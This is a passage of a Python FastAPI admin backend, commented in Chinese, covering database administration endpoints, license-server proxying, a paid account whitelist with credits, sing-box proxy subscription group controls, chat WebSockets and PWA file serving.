    check_db_auth(request)

    return await db.get_table_schema(table_name)



@app.get("/admin/api/db/query/{table_name}")

async def admin_db_query(table_name: str, request: Request,

                         limit: int = 100, offset: int = 0,

                         order_by: str = None, order_desc: bool = True):

    check_db_auth(request)

    return await db.query_table(table_name, limit, offset, order_by, order_desc)



@app.post("/admin/api/db/insert/{table_name}")

async def admin_db_insert(table_name: str, request: Request):

    check_db_auth(request)

    data = await request.json()

    try:

        row_id = await db.insert_row(table_name, data)

        return {"success": True, "id": row_id}

    except Exception as e:

        raise HTTPException(status_code=400, detail=str(e))



@app.put("/admin/api/db/update/{table_name}")

async def admin_db_update(table_name: str, request: Request):

    check_db_auth(request)

    data = await request.json()

    pk_column = data.pop('_pk_column', 'id')

    pk_value = data.pop('_pk_value', None)

    if pk_value is None:

        raise HTTPException(status_code=400, detail="缺少主键值")

    try:

        affected = await db.update_row(table_name, pk_column, pk_value, data)

        return {"success": True, "affected_rows": affected}

    except Exception as e:

        raise HTTPException(status_code=400, detail=str(e))



@app.delete("/admin/api/db/delete/{table_name}")

async def admin_db_delete_row(table_name: str, request: Request,

                              pk_column: str = "id", pk_value: str = None):

    check_db_auth(request)

    if pk_value is None:

        raise HTTPException(status_code=400, detail="缺少主键值")

    try:

        affected = await db.delete_row(table_name, pk_column, pk_value)

        return {"success": True, "affected_rows": affected}

    except Exception as e:

        raise HTTPException(status_code=400, detail=str(e))



@app.post("/admin/api/db/sql")

async def admin_db_sql(request: Request):

    check_db_auth(request)

    data = await request.json()

    sql = data.get('sql', '')

    if not sql:

        raise HTTPException(status_code=400, detail="缺少SQL语句")

    try:

        result = await db.execute_sql(sql)

        return {"success": True, "result": result}

    except Exception as e:

        raise HTTPException(status_code=400, detail=str(e))





# --- 激活码管理代理 ---

async def proxy_license_request(method: str, path: str, params: dict = None, json_body: dict = None):

    url = f"{LICENSE_SERVER_URL}/api/v1{path}"

    if params is None:

        params = {}

    if 'admin_key' not in params:

        params['admin_key'] = LICENSE_ADMIN_KEY

    if json_body and 'admin_key' not in json_body:

        json_body['admin_key'] = LICENSE_ADMIN_KEY

    try:

        async with httpx.AsyncClient(timeout=15.0) as client:

            if method == 'GET':

                resp = await client.get(url, params=params)

            else:

                resp = await client.post(url, json=json_body, params=params)

            return resp.json()

    except httpx.ConnectError:

        return {"error": True, "message": "无法连接激活码服务器"}

    except Exception as e:

        return {"error": True, "message": f"代理请求失败: {str(e)}"}



@app.get("/admin/api/license/statistics")

async def license_statistics(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await proxy_license_request('GET', '/admin/statistics')



@app.get("/admin/api/license/list")

async def license_list(request: Request, limit: int = 50, offset: int = 0):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await proxy_license_request('GET', '/admin/licenses', params={'limit': limit, 'offset': offset})



@app.get("/admin/api/license/info/{license_key}")

async def license_info(license_key: str, request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await proxy_license_request('GET', f'/admin/license-info/{license_key}')



@app.post("/admin/api/license/create")

async def license_create(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if not check_token_permission(token, 'license'):

        return {"error": True, "message": "您没有激活码管理权限"}

    data = await request.json()

    role = get_token_role(token)

    result = await proxy_license_request('POST', '/admin/create-license', json_body=data)

    if isinstance(result, dict) and not result.get('error'):

        lk = result.get('data', {}).get('license_key', '')

        detail = f"有效期{data.get('expiry_days', 365)}天"

        await db.add_license_log('create', lk, data.get('product_id'), data.get('billing_mode'), detail, role)

    return result



@app.post("/admin/api/license/revoke")

async def license_revoke(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if not check_token_permission(token, 'license'):

        return {"error": True, "message": "您没有激活码管理权限"}

    data = await request.json()

    result = await proxy_license_request('POST', '/admin/revoke-license', json_body=data)

    if isinstance(result, dict) and not result.get('error'):

        await db.add_license_log('revoke', data.get('license_key'), detail='撤销激活码', operator=get_token_role(token))

    return result



@app.post("/admin/api/license/edit")

async def license_edit(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if not check_token_permission(token, 'license'):

        return {"error": True, "message": "您没有激活码管理权限"}

    data = await request.json()

    return await proxy_license_request('POST', '/admin/edit-license', json_body=data)



@app.get("/admin/api/license/clients")

async def license_clients(request: Request, limit: int = 100, offset: int = 0):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await proxy_license_request('GET', '/admin/clients', params={'limit': limit, 'offset': offset})



@app.get("/admin/api/license/clients/{client_id}")

async def license_client_detail(client_id: str, request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await proxy_license_request('GET', f'/admin/clients/{client_id}')



@app.post("/admin/api/license/blacklist/add")

async def license_blacklist_add(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if not check_token_permission(token, 'license'):

        return {"error": True, "message": "您没有激活码管理权限"}

    data = await request.json()

    return await proxy_license_request('POST', '/admin/blacklist', json_body=data)



@app.post("/admin/api/license/blacklist/remove")

async def license_blacklist_remove(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if not check_token_permission(token, 'license'):

        return {"error": True, "message": "您没有激活码管理权限"}

    data = await request.json()

    return await proxy_license_request('POST', '/admin/blacklist/remove', json_body=data)



@app.get("/admin/api/license/blacklist")

async def license_blacklist_list(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await proxy_license_request('GET', '/admin/blacklist')



@app.get("/admin/api/license/online-clients")

async def license_online_clients(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await proxy_license_request('GET', '/admin/online-clients')



@app.post("/admin/api/license/disable-client")

async def license_disable_client(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if get_token_role(token) != ROLE_SUPER_ADMIN:

        return {"error": True, "message": "仅系统总管理员可禁用客户端"}

    data = await request.json()

    return await proxy_license_request('POST', '/admin/disable-client', json_body=data)



@app.post("/admin/api/license/enable-client")

async def license_enable_client(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if get_token_role(token) != ROLE_SUPER_ADMIN:

        return {"error": True, "message": "仅系统总管理员可启用客户端"}

    data = await request.json()

    return await proxy_license_request('POST', '/admin/enable-client', json_body=data)



@app.get("/admin/api/license/logs")

async def license_logs(request: Request, limit: int = 100, offset: int = 0):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await proxy_license_request('GET', '/admin/logs', params={'limit': limit, 'offset': offset})



@app.get("/admin/api/license/local-logs")

async def license_local_logs(request: Request, action: str = None, limit: int = 50, offset: int = 0):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await db.get_license_logs(action=action or None, limit=limit, offset=offset)



@app.get("/admin/api/license/products")

async def license_products(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    return await proxy_license_request('GET', '/admin/products')



@app.get("/admin/api/license/health")

async def license_health():

    return await proxy_license_request('GET', '/health')



@app.get("/admin/api/proxy_pool/status")

async def admin_proxy_pool_status():

    return {"config": {}, "pool": None, "available": False}





# --- 授权白名单管理 ---



@app.get("/admin/api/whitelist")

async def admin_whitelist_list(request: Request, limit: int = 100, offset: int = 0,

                                status: str = None, search: str = None):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    role = get_token_role(token)

    sub_name = get_token_sub_name(token)

    added_by = sub_name if role == ROLE_SUB_ADMIN and sub_name else None

    return await db.get_authorized_accounts(added_by=added_by, status=status or None,

                                             limit=limit, offset=offset, search=search or None)



@app.post("/admin/api/whitelist/add")

async def admin_whitelist_add(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    role = get_token_role(token)

    sub_name = get_token_sub_name(token)

    data = await request.json()

    username = data.get('username', '').strip()

    password = data.get('password', '')

    plan_type = data.get('plan_type', 'monthly')

    remark = data.get('remark', '')

    nickname = data.get('nickname', '').strip()

    if not username:

        return {"success": False, "message": "账号不能为空"}



    configs = await db.get_credit_config()

    config_map = {c['plan_type']: c for c in configs}

    plan = config_map.get(plan_type)

    if not plan:

        return {"success": False, "message": f"未知的套餐类型: {plan_type}"}

    credits_cost = plan['credits_cost']

    duration_days = plan['duration_days']



    if role == ROLE_SUPER_ADMIN:

        added_by = sub_name if sub_name and sub_name != '__super__' else 'super_admin'

    else:

        added_by = sub_name or 'unknown'

        try:

            await db.deduct_credits(added_by, credits_cost, related_username=username,

                                     description=f"授权账号[{username}] {plan['plan_name']}")

        except ValueError as e:

            return {"success": False, "message": str(e)}



    try:

        result = await db.add_authorized_account(

            username=username, password=password, added_by=added_by,

            plan_type=plan_type, credits_cost=credits_cost,

            duration_days=duration_days, remark=remark, nickname=nickname)

        return {"success": True, "message": f"账号 [{username}] 已授权 {plan['plan_name']}({duration_days}天)",

                "data": result}

    except Exception as e:

        if role != ROLE_SUPER_ADMIN:

            try:

                await db.topup_credits(added_by, credits_cost, operator='system',

                                        description=f"授权失败退回: {username}")

            except Exception:

                pass

        return {"success": False, "message": f"添加失败: {e}"}



@app.post("/admin/api/whitelist/renew")

async def admin_whitelist_renew(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    role = get_token_role(token)

    sub_name = get_token_sub_name(token)

    data = await request.json()

    username = data.get('username', '').strip()

    plan_type = data.get('plan_type', 'monthly')

    if not username:

        return {"success": False, "message": "账号不能为空"}



    configs = await db.get_credit_config()

    config_map = {c['plan_type']: c for c in configs}

    plan = config_map.get(plan_type)

    if not plan:

        return {"success": False, "message": f"未知的套餐类型: {plan_type}"}



    if role != ROLE_SUPER_ADMIN:

        admin_name = sub_name or 'unknown'

        try:

            await db.deduct_credits(admin_name, plan['credits_cost'], related_username=username,

                                     description=f"续期账号[{username}] {plan['plan_name']}")

        except ValueError as e:

            return {"success": False, "message": str(e)}



    try:

        result = await db.renew_authorized_account(

            username=username, plan_type=plan_type,

            credits_cost=plan['credits_cost'], duration_days=plan['duration_days'])

        if not result:

            return {"success": False, "message": f"账号 [{username}] 不存在"}

        return {"success": True, "message": f"账号 [{username}] 已续期 {plan['plan_name']}", "data": result}

    except Exception as e:

        if role != ROLE_SUPER_ADMIN:

            try:

                await db.topup_credits(sub_name or 'unknown', plan['credits_cost'],

                                        operator='system', description=f"续期失败退回: {username}")

            except Exception:

                pass

        return {"success": False, "message": f"续期失败: {e}"}



@app.post("/admin/api/whitelist/delete")

async def admin_whitelist_delete(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    data = await request.json()

    username = data.get('username', '').strip()

    if not username:

        return {"success": False, "message": "账号不能为空"}

    ok = await db.delete_authorized_account(username)

    if ok:

        return {"success": True, "message": f"账号 [{username}] 已删除（积分不退还）"}

    return {"success": False, "message": f"账号 [{username}] 不存在"}



@app.get("/admin/api/whitelist/expiring")

async def admin_whitelist_expiring(request: Request, days: int = 7):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    role = get_token_role(token)

    sub_name = get_token_sub_name(token)

    added_by = sub_name if role == ROLE_SUB_ADMIN and sub_name else None

    return await db.get_expiring_accounts(days=days, added_by=added_by)



@app.post("/admin/api/whitelist/toggle_persist")

async def admin_whitelist_toggle_persist(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    data = await request.json()

    username = data.get('username', '').strip()

    enabled = bool(data.get('enabled', False))

    if not username:

        return {"success": False, "message": "账号不能为空"}

    try:

        ok = await db.toggle_persistent_login(username, enabled)

        if ok:

            return {"success": True, "message": f"账号 [{username}] 强化登录已{'开启' if enabled else '关闭'}"}

        return {"success": False, "message": f"账号 [{username}] 不存在或状态异常"}

    except Exception as e:

        logger.error(f"[Whitelist] toggle_persist 失败: {e}")

        return {"success": False, "message": f"操作失败: {str(e)}"}





@app.get("/admin/api/whitelist/global_status")
async def admin_whitelist_global_status(request: Request):
    """获取全体白名单开关状态"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    try:
        enabled = await db.get_whitelist_global_status()
        return {
            "success": True,
            "enabled": enabled,
            "description": "全体白名单：开启后所有人可登录AK服务器，关闭后仅白名单用户可登录"
        }
    except Exception as e:
        logger.error(f"[Whitelist] 获取全局开关失败: {e}")
        return {"success": False, "message": f"获取失败: {str(e)}"}


@app.post("/admin/api/whitelist/set_global")
async def admin_whitelist_set_global(request: Request):
    """设置全体白名单开关"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    data = await request.json()
    enabled = bool(data.get('enabled', False))
    try:
        ok = await db.set_whitelist_global_status(enabled)
        if ok:
            status_text = "开启" if enabled else "关闭"
            logger.info(f"[Whitelist] 全体白名单已{status_text}")
            return {
                "success": True, "enabled": enabled,
                "message": f"全体白名单已{status_text}（{'所有人可登录' if enabled else '仅白名单用户可登录'}）"
            }
        return {"success": False, "message": "设置失败"}
    except Exception as e:
        logger.error(f"[Whitelist] 设置全局开关失败: {e}")
        return {"success": False, "message": f"设置失败: {str(e)}"}





# --- 积分管理 ---



@app.get("/admin/api/credits/config")

async def admin_credits_config():

    return await db.get_credit_config()



@app.post("/admin/api/credits/config")

async def admin_credits_config_update(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if get_token_role(token) != ROLE_SUPER_ADMIN:

        return {"success": False, "message": "仅总管理员可修改积分定价"}

    data = await request.json()

    plan_type = data.get('plan_type', '').strip()

    plan_name = data.get('plan_name', '').strip()

    credits_cost = int(data.get('credits_cost', 0))

    duration_days = int(data.get('duration_days', 0))

    if not plan_type or not plan_name or credits_cost <= 0 or duration_days <= 0:

        return {"success": False, "message": "参数无效"}

    await db.update_credit_config(plan_type, plan_name, credits_cost, duration_days)

    return {"success": True, "message": f"定价 [{plan_name}] 已保存"}



@app.delete("/admin/api/credits/config/{plan_type}")

async def admin_credits_config_delete(plan_type: str, request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if get_token_role(token) != ROLE_SUPER_ADMIN:

        return {"success": False, "message": "仅总管理员可删除积分定价"}

    ok = await db.delete_credit_config(plan_type)

    return {"success": ok, "message": "已删除" if ok else "不存在"}



@app.get("/admin/api/credits/overview")

async def admin_credits_overview(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if get_token_role(token) != ROLE_SUPER_ADMIN:

        return {"success": False, "message": "仅总管理员可查看"}

    return await db.get_all_sub_admin_credits()



@app.get("/admin/api/credits/balance")

async def admin_credits_balance(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    role = get_token_role(token)

    sub_name = get_token_sub_name(token)

    if role == ROLE_SUPER_ADMIN:

        return {"balance": -1, "unlimited": True}

    balance = await db.get_sub_admin_credits(sub_name)

    return {"balance": balance, "unlimited": False}



@app.post("/admin/api/credits/topup")

async def admin_credits_topup(request: Request):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    if get_token_role(token) != ROLE_SUPER_ADMIN:

        return {"success": False, "message": "仅总管理员可充值积分"}

    data = await request.json()

    admin_name = data.get('admin_name', '').strip()

    amount = int(data.get('amount', 0))

    description = data.get('description', '')

    if not admin_name or admin_name not in SUB_ADMINS:

        return {"success": False, "message": f"子管理员 [{admin_name}] 不存在"}

    if amount <= 0:

        return {"success": False, "message": "充值金额必须大于0"}

    try:

        result = await db.topup_credits(admin_name, amount, operator='super_admin',

                                         description=description or f"总管理充值{amount}积分")

        return {"success": True, "message": f"已给 [{admin_name}] 充值 {amount} 积分，余额: {result['balance']}",

                "data": result}

    except Exception as e:

        return {"success": False, "message": f"充值失败: {e}"}



@app.get("/admin/api/credits/transactions")

async def admin_credits_transactions(request: Request, admin_name: str = None,

                                      limit: int = 50, offset: int = 0):

    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    if not await verify_admin_token(token):

        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})

    role = get_token_role(token)

    sub_name = get_token_sub_name(token)

    if role == ROLE_SUPER_ADMIN:

        query_name = admin_name or None

    else:

        query_name = sub_name
    return await db.get_credit_transactions(admin_name=query_name, limit=limit, offset=offset)





# --- 订阅组管理 ---

@app.get("/admin/api/nodes")
async def admin_get_nodes(request: Request):
    """获取节点列表（含group_id）"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    try:
        import singbox_manager as sbm
        nodes = sbm.load_saved_nodes()
        return {"success": True, "nodes": nodes}
    except Exception as e:
        logger.error(f"[Nodes] 获取节点列表失败: {e}")
        return {"success": False, "message": f"获取失败: {str(e)}", "nodes": []}


@app.get("/admin/api/subscription_groups")
async def admin_get_subscription_groups(request: Request):
    """获取订阅组列表"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    try:
        role = get_token_role(token)
        sub_name = get_token_sub_name(token)
        created_by = None if role == ROLE_SUPER_ADMIN else sub_name
        groups = await db.get_subscription_groups(created_by)
        return {"success": True, "groups": groups}
    except Exception as e:
        logger.error(f"[SubGroup] 获取订阅组列表失败: {e}")
        return {"success": False, "message": f"获取失败: {str(e)}"}


@app.patch("/admin/api/subscription_groups/{group_id}/notes")
async def admin_update_subscription_group_notes(group_id: str, request: Request):
    """更新订阅组备注"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    try:
        data = await request.json()
        notes = data.get('notes', '')
        ok = await db.update_subscription_group_notes(group_id, notes)
        return {"success": ok, "message": "备注已更新" if ok else "更新失败"}
    except Exception as e:
        logger.error(f"[SubGroup] 更新订阅组备注失败: {e}")
        return {"success": False, "message": f"更新失败: {str(e)}"}


@app.delete("/admin/api/subscription_groups/{group_id}")
async def admin_delete_subscription_group(group_id: str, request: Request):
    """删除订阅组"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    try:
        ok = await db.delete_subscription_group(group_id)
        if ok:
            import singbox_manager as sbm
            nodes = sbm.load_saved_nodes()
            filtered = [n for n in nodes if isinstance(n, dict) and n.get('group_id') != group_id]
            if len(filtered) < len(nodes):
                sbm.save_nodes(filtered)
                sbm.write_config(filtered)
                sbm.reload_service()
            # 从 dispatcher 内存移除所有 SOCKS5 出口（保留直连 #0）
            for i in range(len(dispatcher.exits) - 1, 0, -1):
                dispatcher.remove_exit(i)
            return {"success": True, "message": "订阅组已删除"}
        return {"success": False, "message": "删除失败"}
    except Exception as e:
        logger.error(f"[SubGroup] 删除订阅组失败: {e}")
        return {"success": False, "message": f"删除失败: {str(e)}"}


@app.post("/admin/api/subscription_groups/{group_id}/toggle_by_ip")
async def admin_toggle_server_by_ip(group_id: str, request: Request):
    """按IP批量切换服务器状态"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    data = await request.json()
    server = data.get('server', '')
    enabled = bool(data.get('enabled', True))
    try:
        import singbox_manager as sbm
        nodes = sbm.load_saved_nodes()
        matching = [i for i, n in enumerate(nodes) if isinstance(n, dict) and n.get('group_id') == group_id and n.get('server') == server]
        if not matching:
            return {"success": False, "message": "未找到该服务器的节点"}
        for idx in matching:
            nodes[idx]['enabled'] = enabled
        sbm.save_nodes(nodes)
        group_nodes = [n for n in nodes if isinstance(n, dict) and n.get('group_id') == group_id]
        unique_servers = set(n.get('server') for n in group_nodes if n.get('server'))
        enabled_servers = set(n.get('server') for n in group_nodes if n.get('enabled', True) and n.get('server'))
        await db.update_subscription_group_servers(group_id, len(unique_servers), len(enabled_servers))
        sbm.write_config(nodes)
        sbm.reload_service()
        return {"success": True, "message": f"已{'启用' if enabled else '禁用'}{server}的{len(matching)}个节点"}
    except Exception as e:
        logger.error(f"[SubGroup] 按IP切换服务器状态失败: {e}")
        return {"success": False, "message": f"操作失败: {str(e)}"}


@app.post("/admin/api/subscription_groups/{group_id}/toggle_all")
async def admin_toggle_all_servers(group_id: str, request: Request):
    """批量切换订阅组所有服务器状态"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    data = await request.json()
    enabled = bool(data.get('enabled', True))
    try:
        import singbox_manager as sbm
        nodes = sbm.load_saved_nodes()
        group_indices = [i for i, n in enumerate(nodes) if isinstance(n, dict) and n.get('group_id') == group_id]
        if not group_indices:
            return {"success": False, "message": "该组暂无服务器"}
        for idx in group_indices:
            nodes[idx]['enabled'] = enabled
        sbm.save_nodes(nodes)
        group_node_list = [nodes[i] for i in group_indices if isinstance(nodes[i], dict)]
        unique_servers = set(n.get('server') for n in group_node_list if n.get('server'))
        active_count = len(unique_servers) if enabled else 0
        await db.update_subscription_group_servers(group_id, len(unique_servers), active_count)
        sbm.write_config(nodes)
        sbm.reload_service()
        return {"success": True, "message": f"已{'启用' if enabled else '禁用'}{len(unique_servers)}个独立IP"}
    except Exception as e:
        logger.error(f"[SubGroup] 批量切换服务器状态失败: {e}")
        return {"success": False, "message": f"操作失败: {str(e)}"}


@app.post("/admin/api/subscription_groups/{group_id}/toggle_server")
async def admin_toggle_server(group_id: str, request: Request):
    """切换单个服务器启用/禁用状态"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not await verify_admin_token(token):
        return JSONResponse(status_code=401, content={"error": True, "message": "未授权"})
    data = await request.json()
    server_index = data.get('server_index', -1)
    enabled = bool(data.get('enabled', True))
    try:
        import singbox_manager as sbm
        nodes = sbm.load_saved_nodes()
        group_indices = [i for i, n in enumerate(nodes) if isinstance(n, dict) and n.get('group_id') == group_id]
        if 0 <= server_index < len(group_indices):
            node_idx = group_indices[server_index]
            nodes[node_idx]['enabled'] = enabled
            sbm.save_nodes(nodes)
            active_count = sum(1 for i in group_indices if nodes[i].get('enabled', True))
            await db.update_subscription_group_servers(group_id, len(group_indices), active_count)
            sbm.write_config(nodes)
            sbm.reload_service()
            return {"success": True, "message": f"服务器已{'启用' if enabled else '禁用'}"}
        return {"success": False, "message": "服务器索引无效"}
    except Exception as e:
        logger.error(f"[SubGroup] 切换服务器状态失败: {e}")
        return {"success": False, "message": f"操作失败: {str(e)}"}



# --- WebSocket ---

@app.websocket("/admin/ws")

async def admin_websocket(websocket: WebSocket):

    logger.info(f"[WebSocket] 新连接建立: {websocket.client}")
    
    await ws_manager.connect(websocket)

    sub_name = None

    try:

        while True:

            data = await websocket.receive_text()

            try:

                msg = json.loads(data)

                msg_type = msg.get('type')

                if msg_type == 'auth':

                    token = msg.get('token', '')

                    role = get_token_role(token)

                    if role == ROLE_SUB_ADMIN:

                        sub_name = get_token_sub_name(token)

                        if sub_name:

                            ws_manager.register_sub_admin(sub_name, websocket)

                    elif role == ROLE_SUPER_ADMIN:

                        sub_name = '__super__'

                        ws_manager.register_sub_admin(sub_name, websocket)

                elif msg_type == 'heartbeat':
                    await websocket.send_json({'type': 'pong'})
                    if sub_name and sub_name != '__super__':
                        ws_manager.heartbeat_sub_admin(sub_name)

            except Exception:

                pass

    except (WebSocketDisconnect, Exception):

        ws_manager.disconnect(websocket)



@app.websocket("/chat/ws")

async def chat_websocket(websocket: WebSocket):

    await websocket.accept()

    username = websocket.query_params.get('username', 'visitor')

    try:

        while True:

            data = await websocket.receive_json()

            msg_type = data.get('type')

            if msg_type == 'online':

                prev_ws_id = online_manager.users.get(data.get('username', username), {}).get('ws_id')

                await online_manager.user_online(

                    data.get('username', username), websocket,

                    data.get('page', ''), data.get('userAgent', ''))

                username = data.get('username', username)

                if prev_ws_id != id(websocket):

                    history = online_manager.get_messages(username)

                    if history:

                        await websocket.send_json({'type': 'history', 'messages': history})

            elif msg_type == 'heartbeat':

                online_manager.update_heartbeat(username)

                hp = data.get('page', '')

                if hp and username in online_manager.users:

                    online_manager.users[username]['page'] = hp

            elif msg_type == 'user_message':

                content = data.get('content', '')

                if content:

                    online_manager.save_user_message(username, content)

                    await ws_manager.broadcast({'type': 'chat_message', 'data': {

                        'username': username, 'content': content,

                        'time': datetime.now().strftime('%H:%M:%S'), 'is_admin': False}})

            elif msg_type == 'offline':

                online_manager.user_offline(username)

                await ws_manager.broadcast({'type': 'user_offline', 'data': {'username': username}})

                break

    except (WebSocketDisconnect, Exception):

        online_manager.user_offline(username, websocket)





# --- 管理后台页面 ---

@app.get("/admin", response_class=HTMLResponse)

@app.get("/admin/", response_class=HTMLResponse)

async def admin_page():

    html_path = os.path.join(os.path.dirname(__file__), "admin.html")

    if os.path.exists(html_path):

        with open(html_path, "r", encoding="utf-8") as f:

            content = f.read()

        return HTMLResponse(content=content, headers={

            "Cache-Control": "no-cache, no-store, must-revalidate",

            "Pragma": "no-cache", "Expires": "0"

        })

    return "<h1>管理页面未找到</h1>"



@app.get("/chat/widget.js")

async def chat_widget_js():

    js_path = os.path.join(os.path.dirname(__file__), "chat_widget.js")

    if os.path.exists(js_path):

        with open(js_path, "r", encoding="utf-8") as f:

            return Response(content=f.read(), media_type="application/javascript",

                            headers={"Cache-Control": "no-cache, no-store, must-revalidate",

                                     "Pragma": "no-cache", "Expires": "0"})

    return Response(content="// not found", media_type="application/javascript")



@app.get("/manifest.json")

async def pwa_manifest():

    path = os.path.join(os.path.dirname(__file__), "manifest.json")

    if os.path.exists(path):

        with open(path, "r", encoding="utf-8") as f:

            return Response(content=f.read(), media_type="application/manifest+json")

    return Response(content="{}", media_type="application/manifest+json")



@app.get("/sw.js")

async def pwa_sw():

    path = os.path.join(os.path.dirname(__file__), "sw.js")

    if os.path.exists(path):

        with open(path, "r", encoding="utf-8") as f:

            return Response(content=f.read(), media_type="application/javascript",

                          headers={"Service-Worker-Allowed": "/"})

    return Response(content="// not found", media_type="application/javascript")



@app.get("/admin/api/pwa-sw")

async def pwa_sw_api():

    """通过API路径提供SW（绕过CDN对.js文件的拦截）"""

    path = os.path.join(os.path.dirname(__file__), "sw.js")

    if os.path.exists(path):

        with open(path, "r", encoding="utf-8") as f:

            return Response(content=f.read(), media_type="application/javascript",

                          headers={"Service-Worker-Allowed": "/"})



@app.get("/admin/api/pwa-manifest")

async def pwa_manifest_api():

    """通过API路径提供manifest（绕过CDN拦截）"""

    path = os.path.join(os.path.dirname(__file__), "manifest.json")

    if os.path.exists(path):

        with open(path, "r", encoding="utf-8") as f:

            import json

            data = json.loads(f.read())

            # 图标路径换成API路径（绕过CDN）

            data.pop('theme_color', None)  # 不设置theme_color，保持浏览器默认

            data['icons'] = [

                {'src': '/admin/api/pwa-icon/192', 'sizes': '192x192', 'type': 'image/png', 'purpose': 'any'},

                {'src': '/admin/api/pwa-icon/512', 'sizes': '512x512', 'type': 'image/png', 'purpose': 'any'},

                {'src': '/admin/api/pwa-icon-maskable/192', 'sizes': '192x192', 'type': 'image/png', 'purpose': 'maskable'},

